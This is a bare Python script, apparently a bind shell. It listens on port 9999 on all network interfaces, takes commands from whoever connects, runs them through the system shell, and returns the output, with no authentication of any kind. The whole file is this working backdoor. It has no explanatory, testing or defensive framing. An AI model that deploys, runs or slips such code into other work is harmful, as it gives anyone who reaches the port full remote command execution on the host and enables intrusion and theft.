import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 9999       # Port to listen on

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"Listening on {HOST}:{PORT}...")

    conn, addr = server.accept()
    with conn:
        print(f"Connection from {addr}")
        while True:
            data = conn.recv(1024).decode().strip()
            if not data or data.lower() == 'exit':
                break
            try:
                output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                conn.sendall(output)
            except Exception as e:
                conn.sendall(str(e).encode())

print("Connection closed.")

